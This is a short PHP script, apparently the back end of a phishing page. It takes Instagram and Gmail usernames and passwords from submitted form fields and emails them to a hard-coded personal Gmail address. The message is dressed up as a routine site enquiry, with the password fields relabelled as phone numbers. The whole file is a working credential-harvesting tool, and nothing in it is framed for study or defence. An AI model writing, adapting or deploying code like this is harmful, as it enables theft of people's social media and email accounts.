<?php

$recepient = "innadanylevska@gmail.com";
$sitename = "idress4weather.github.io";

$instaName = trim($_POST["instaName"]);
$instaPassword = trim($_POST["instaPassword"]);
$gmailName = trim($_POST["gmailName"]);
$gmailPassword = trim($_POST["gmailPassword"]);
$message = "Имя: $instaName \nТелефон: $instaPassword \n$gmailName \nТелефон: $gmailPassword";

$pagetitle = "Новая заявка с сайта \"$sitename\"";
mail($recepient, $pagetitle, $message, "Content-type: text/plain; charset=\"utf-8\"\n From: $recepient");
